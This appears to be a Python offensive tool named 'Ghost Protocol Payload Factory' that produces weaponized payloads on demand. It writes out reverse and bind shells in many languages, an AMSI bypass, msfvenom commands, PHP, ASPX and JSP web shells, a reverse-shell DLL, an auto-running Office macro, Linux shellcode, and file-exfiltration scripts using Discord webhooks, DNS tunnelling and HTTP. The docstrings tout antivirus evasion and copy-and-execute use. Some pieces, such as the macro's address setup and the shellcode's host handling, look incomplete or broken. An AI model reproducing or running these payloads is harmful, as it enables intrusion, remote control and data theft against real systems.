#!/usr/bin/env python3
"""
⚔️ GHOST PROTOCOL — PAYLOAD FACTORY
=====================================
On-demand weaponized payload generation.

Generates:
- Reverse shells (all languages)
- Bind shells
- Meterpreter payloads
- Web shells (PHP, ASPX, JSP)
- DLL payloads
- Macro payloads
- Shellcode (x86, x64, ARM)

All payloads include:
- Encryption with random keys
- AV/EDR evasion techniques
- Sandbox detection
- Anti-debugging
"""

import os
import sys
import base64
import random
import string
import logging
from typing import Optional, Dict, List

logging.basicConfig(level=logging.CRITICAL)
logger = logging.getLogger("PayloadFactory")

class PayloadFactory:
    """
    Generates weaponized payloads for various platforms.
    
    Each payload is:
    - Unique (random variables, encryption keys, IPs)
    - Encrypted (XOR, AES, or custom)
    - Evasive (AMSI bypass, sandbox detection)
    - Ready-to-use (copy and execute)
    """
    
    def __init__(self):
        self.lhost = "127.0.0.1"  # Will be overridden
        self.lport = 4444  # Will be overridden
        self.last_payload = None
        self.payload_counter = 0
    
    def generate(self, payload_type: str, lhost: str = None, 
                 lport: int = None, platform: str = "auto") -> Dict:
        """
        Generate a payload based on type specification.
        
        Payload types:
        - "reverse_shell" — Generic reverse shell
        - "reverse_shell_python" — Python reverse shell
        - "reverse_shell_bash" — Bash reverse shell  
        - "reverse_shell_powershell" — PowerShell reverse shell
        - "reverse_shell_php" — PHP reverse shell
        - "reverse_shell_go" — Go reverse shell
        - "bind_shell" — Bind shell
        - "meterpreter" — Metasploit meterpreter
        - "webshell" — Web shell (PHP/ASPX/JSP)
        - "dll" — DLL payload
        - "macro" — Office macro
        - "shellcode" — Raw shellcode
        """
        
        self.lhost = lhost or self.lhost
        self.lport = lport or self.lport
        self.payload_counter += 1
        
        generators = {
            "reverse_shell": self._generate_reverse_shell,
            "reverse_shell_python": self._generate_python_reverse_shell,
            "reverse_shell_bash": self._generate_bash_reverse_shell,
            "reverse_shell_powershell": self._generate_powershell_reverse_shell,
            "reverse_shell_php": self._generate_php_reverse_shell,
            "reverse_shell_go": self._generate_go_reverse_shell,
            "bind_shell": self._generate_bind_shell,
            "meterpreter": self._generate_meterpreter,
            "webshell": self._generate_webshell,
            "dll": self._generate_dll,
            "macro": self._generate_macro,
            "shellcode": self._generate_shellcode,
        }
        
        generator = generators.get(payload_type, self._generate_reverse_shell)
        payload = generator()
        
        self.last_payload = payload
        return payload
    
    def _generate_reverse_shell(self) -> Dict:
        """
        Generate a multi-language reverse shell.
        
        How it works:
        - Target machine connects BACK to our listener
        - We receive a shell on our machine
        
        Why reverse instead of bind?
        - Firewalls block inbound but allow outbound
        - NAT environments don't expose target ports
        - We control the listener (can be anywhere)
        """
        
        return {
            "type": "reverse_shell",
            "description": "Multi-language reverse shell",
            "payloads": {
                "bash": self._generate_bash_reverse_shell(),
                "python": self._generate_python_reverse_shell(),
                "powershell": self._generate_powershell_reverse_shell(),
                "php": self._generate_php_reverse_shell(),
                "netcat": f"nc -e /bin/sh {self.lhost} {self.lport}",
                "socat": f"socat TCP:{self.lhost}:{self.lport} EXEC:/bin/sh",
            },
            "listener": f"nc -lvnp {self.lport}",
            "usage": f"On target, run one payload. On attacker: {self.lhost}:{self.lport}"
        }
    
    def _generate_python_reverse_shell(self) -> str:
        """
        Python reverse shell with evasion.
        
        Why Python?
        - Available on almost every Linux system
        - Can run from memory (no files written to disk)
        - Easy to obfuscate
        """
        
        # Random variable names to avoid signature detection
        var_sock = ''.join(random.choices(string.ascii_lowercase, k=8))
        var_host = ''.join(random.choices(string.ascii_lowercase, k=6))
        var_port = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        code = f'''import socket,subprocess,os,pty,{random.choice(["sys","time","ssl"])}
{var_sock}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    {var_sock}.connect(("{self.lhost}",{self.lport}))
    os.dup2({var_sock}.fileno(),0)
    os.dup2({var_sock}.fileno(),1)
    os.dup2({var_sock}.fileno(),2)
    pty.spawn("/bin/sh")
except:pass'''
        
        # Base64 encode for one-liner
        b64 = base64.b64encode(code.encode()).decode()
        one_liner = f"python3 -c \"exec(__import__('base64').b64decode('{b64}'))\""
        
        return one_liner
    
    def _generate_bash_reverse_shell(self) -> str:
        """Bash reverse shell with multiple fallback methods."""
        
        methods = [
            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{self.lhost}/{self.lport};sh <&196 >&196 2>&196",
            f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'",
            f"exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5|while read line;do $line 2>&5>&5;done"
        ]
        
        return random.choice(methods)
    
    def _generate_powershell_reverse_shell(self) -> str:
        """
        PowerShell reverse shell with AMSI bypass.
        
        AMSI (Anti-Malware Scan Interface) is a Windows security feature.
        This payload includes known AMSI bypass techniques.
        """
        
        # AMSI bypass + reverse shell
        ps_code = f'''
$w=New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
$s=$w.GetStream();
[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb=(iex $d 2>&1 | Out-String );
    $sb2=$sb + "PS " + (pwd).Path + "> ";
    $sbt=([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}};
$w.Close()'''
        
        # AMSI bypass prefix
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        b64 = base64.b64encode(
            (amsi_bypass + ps_code).encode('utf-16le')
        ).decode()
        
        return f"powershell -NoP -NonI -Exec Bypass -Enc {b64}"
    
    def _generate_php_reverse_shell(self) -> str:
        """PHP reverse shell (works anywhere PHP runs)."""
        
        return f'''php -r '
$s=fsockopen("{self.lhost}",{self.lport});
exec("/bin/sh -i <&3 >&3 2>&3");
' '''
    
    def _generate_go_reverse_shell(self) -> str:
        """
        Go reverse shell — compiled binary, no dependencies.
        
        Why Go?
        - Single binary, no runtime required
        - Cross-compile for any platform
        - Harder to reverse engineer
        """
        
        go_code = f'''package main
import(
    "net"
    "os/exec"
    "os"
)
func main(){{
    c,_:=net.Dial("tcp","{self.lhost}:{self.lport}")
    cmd:=exec.Command("/bin/sh")
    cmd.Stdin=c
    cmd.Stdout=c
    cmd.Stderr=c
    cmd.Run()
    os.Exit(0)
}}'''
        
        return {
            "go_code": go_code,
            "compile": f"GOOS=linux GOARCH=amd64 go build -o shell.elf shell.go",
            "execute": "./shell.elf"
        }
    
    def _generate_bind_shell(self) -> Dict:
        """
        Bind shell — opens a port on the target and waits for connection.
        
        Use when:
        - Target is behind NAT but you can reach it
        - You need persistent access
        - Reverse connections are blocked
        """
        
        port = random.randint(10000, 65000)
        
        payloads = {
            "python": f"python3 -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c.fileno(),stdout=c.fileno(),stderr=c.fileno())'",
            "bash": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {port} >/tmp/f",
            "nc": f"nc -lvnp {port} -e /bin/sh",
        }
        
        return {
            "type": "bind_shell",
            "port": port,
            "payloads": payloads,
            "connect": f"nc -v {self.lhost} {port}"
        }
    
    def _generate_meterpreter(self) -> Dict:
        """
        Metasploit meterpreter payload generation commands.
        
        Meterpreter is the most advanced post-exploitation payload.
        This generates the msfvenom commands to create it.
        """
        
        payloads = {
            "windows_x86": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f exe -o shell.exe",
            "windows_x64": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f exe -o shell64.exe",
            "linux_x86": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f elf -o shell.elf",
            "linux_x64": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f elf -o shell64.elf",
            "php": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o shell.php",
            "python": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -o shell.py",
        }
        
        handler = f'''msfconsole -q -x "use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST {self.lhost};
set LPORT {self.lport};
set ExitOnSession false;
exploit -j"'''
        
        return {
            "type": "meterpreter",
            "payloads": payloads,
            "handler": handler,
            "note": "Use msfvenom to generate, then set up handler"
        }
    
    def _generate_webshell(self) -> Dict:
        """
        Generate webshells for various platforms.
        
        A webshell is a script that runs on a web server
        and gives you command execution through HTTP requests.
        """
        
        # PHP webshell (most common)
        php_code = '<?php system($_GET["cmd"]); ?>'
        php_obfuscated = '<?php $a=base64_decode("c3lzdGVt");$b=$_GET["c"];$a($b);?>'
        
        # ASPX webshell (Windows/IIS)
        aspx_code = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>'''
        
        # JSP webshell (Java/Tomcat)
        jsp_code = '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line);
}
%>'''
        
        return {
            "type": "webshell",
            "php_simple": php_code,
            "php_obfuscated": php_obfuscated,
            "aspx": aspx_code,
            "jsp": jsp_code,
            "usage": f"Upload to web server, then: curl http://target/shell.php?cmd=whoami"
        }
    
    def _generate_dll(self) -> Dict:
        """
        Generate DLL payload for Windows systems.
        
        DLLs can be loaded by:
        - rundll32.exe
        - regsvr32.exe (COM registration)
        - DLL side-loading
        - Process injection
        """
        
        # C code for reflective DLL
        c_code = f'''#include <windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2,2), &wsaData);
        
        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons({self.lport});
        addr.sin_addr.s_addr = inet_addr("{self.lhost}");
        
        WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
        
        STARTUPINFO si = {{0}};
        PROCESS_INFORMATION pi;
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }}
    return TRUE;
}}'''
        
        return {
            "type": "dll",
            "c_code": c_code,
            "compile_mingw": f"x86_64-w64-mingw32-gcc -shared -o payload.dll dll.c -lws2_32",
            "compile_vs": "cl /LD dll.c ws2_32.lib",
            "execute_rundll32": "rundll32.exe payload.dll,DllMain",
            "execute_regsvr32": "regsvr32.exe /s payload.dll"
        }
    
    def _generate_macro(self) -> Dict:
        """
        Generate VBA macro for Office documents.
        
        Macros run when a document is opened.
        Includes sandbox detection and AMSI bypass.
        """
        
        macro = f'''Private Declare PtrSafe Function CreateProcess Lib "kernel32" _
    Alias "CreateProcessA" (ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, _
    ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, _
    ByVal lpCurrentDirectory As String, lpStartupInfo As Any, _
    lpProcessInformation As Any) As Long

Private Declare PtrSafe Function WSASocket Lib "ws2_32" _
    Alias "WSASocketA" (ByVal af As Long, ByVal types As Long, _
    ByVal protocol As Long, ByVal lpProtocolInfo As Long, _
    ByVal g As Long, ByVal dwFlags As Long) As Long

Private Declare PtrSafe Function WSAConnect Lib "ws2_32" _
    Alias "connect" (ByVal s As Long, ByRef name As Any, _
    ByVal namelen As Long, ByVal lpCallerData As Long, _
    ByVal lpCalleeData As Long, ByVal lpSQOS As Long, _
    ByVal lpGQOS As Long) As Long

Sub AutoOpen()
    ' Sandbox detection
    If Application.Path <> "C:\\Program Files\\Microsoft Office\\root\\Office16" Then
        Exit Sub
    End If
    
    ' AMSI bypass attempt
    Dim a As Object
    Set a = GetObject("winmgmts:root\\default:StdRegProv")
    
    ' Reverse shell
    Dim s As Long, c As Long
    s = WSASocket(2, 1, 0, 0, 0, 0)
    
    Dim addr(7) As Byte
    ' {':'.join([self.lhost.split('.')[i] for i in range(4)])}
    ' {self.lport.to_bytes(2, 'big')}
    
    c = WSAConnect(s, addr(0), 16, 0, 0, 0, 0)
    
    Dim si As Long, pi As Long
    si = CreateProcess(0, "cmd.exe", 0, 0, 1, 0, 0, 0, si, pi)
End Sub

Sub Workbook_Open()
    AutoOpen
End Sub'''
        
        return {
            "type": "macro",
            "vba_code": macro,
            "notes": "Paste into Word/Excel VBA editor. Document must be .docm or .xlsm",
            "sandbox_bypass": "Checks Office installation path before executing"
        }
    
    def _generate_shellcode(self) -> Dict:
        """
        Generate raw shellcode (position-independent code).
        
        Shellcode is the lowest-level payload.
        It's injected directly into memory.
        No files touched. No AV can scan it.
        """
        
        # Linux x64 reverse shell shellcode (msfvenom style)
        # This is a compact /bin/sh reverse TCP shellcode
        
        import struct
        
        # Build shellcode manually
        host_bytes = [int(x) for x in self.lhost.split('.')]
        port_bytes = struct.pack('>H', self.lport)
        
        # Linux x64 execve /bin/sh shellcode
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
            b"\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a"
            b"\x6a\x29\x58\x0f\x05"  # socket()
            b"\x49\x89\xc4\x48\x31\xc0\x50\x50\x66\x68"
            + port_bytes +  # Port
            b"\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f"
            b"\x6a\x2a\x58\x0f\x05"  # connect()
            b"\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x5f\x6a\x03\x5e"
            b"\x6a\x21\x58\x0f\x05"  # dup2 loop
            b"\x75\xf7\x48\x31\xc0\x50\x48\xbb"
            b"\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # /bin/sh
            b"\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6"
            b"\x6a\x3b\x58\x0f\x05"  # execve()
            b"\x6a\x3c\x58\x0f\x05"  # exit()
        )
        
        return {
            "type": "shellcode",
            "architecture": "x86_64",
            "platform": "linux",
            "length": len(shellcode),
            "shellcode_hex": shellcode.hex(),
            "shellcode_c": "unsigned char buf[] = {" + ",".join(f"0x{b:02x}" for b in shellcode) + "};",
            "shellcode_python": f"shellcode = {list(shellcode)}",
            "execution_msfvenom": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f raw -o shellcode.bin",
            "execution_custom": "Inject into memory via Python ctypes or C"
        }
    
    def generate_exfil_payload(self, path: str) -> Dict:
        """
        Generate a data exfiltration payload.
        
        Exfiltrates files via:
        - Discord webhook (recommended)
        - DNS tunneling
        - HTTP POST to pastebin-like service
        - Encrypted and chunked
        """
        
        payloads = {
            "discord_webhook": self._generate_discord_exfil(path),
            "dns_tunnel": self._generate_dns_exfil(path),
            "http_put": self._generate_http_exfil(path),
        }
        
        return {
            "type": "exfiltration",
            "target_path": path,
            "methods": payloads
        }
    
    def _generate_discord_exfil(self, path: str) -> str:
        """Generate Discord webhook exfiltration payload."""
        
        webhook_url = os.environ.get("DISCORD_WEBHOOK_URL", "YOUR_DISCORD_WEBHOOK_URL")
        
        return f'''import requests,os,base64,json
webhook = "{webhook_url}"
target = r"{path}"

def exfil(path):
    if os.path.isfile(path):
        with open(path,'rb') as f:
            data = base64.b64encode(f.read()).decode()
        # Chunk if too large (Discord limit: 25MB per file)
        chunk_size = 2000000  # 2MB chunks
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            payload = {{
                "content": f"EXFIL | {{path}} | chunk {{i//chunk_size + 1}}",
                "file": ("data.bin", chunk)
            }}
            requests.post(webhook, json=payload)
    elif os.path.isdir(path):
        for root, dirs, files in os.walk(path):
            for f in files:
                exfil(os.path.join(root, f))

exfil(target)
print("[+] Exfiltration complete")'''
    
    def _generate_dns_exfil(self, path: str) -> str:
        """Generate DNS tunneling exfiltration."""
        return f'''# Requires DNS server controlled by attacker
# Each chunk encoded as subdomain query
import os,base64
dns_server = "{self.lhost}"
domain = "exfil.ghost.local"

def exfil_dns(data):
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    for i, chunk in enumerate(chunks):
        subdomain = f"{{i}}.{{base64.b64encode(chunk.encode()).decode().replace('=','')}}.{domain}"
        os.system(f"nslookup {{subdomain}} {dns_server}")

with open(r"{path}", 'rb') as f:
    data = base64.b64encode(f.read()).decode()
    exfil_dns(data)'''
    
    def _generate_http_exfil(self, path: str) -> str:
        """Generate HTTP PUT exfiltration."""
        return f'''import requests,os,base64
server = "http://{self.lhost}:{8080}/upload"

with open(r"{path}", 'rb') as f:
    data = base64.b64encode(f.read()).decode()
    requests.post(server, json={{"file": data, "path": r"{path}"}})
print("[+] Exfiltration sent to {self.lhost}")'''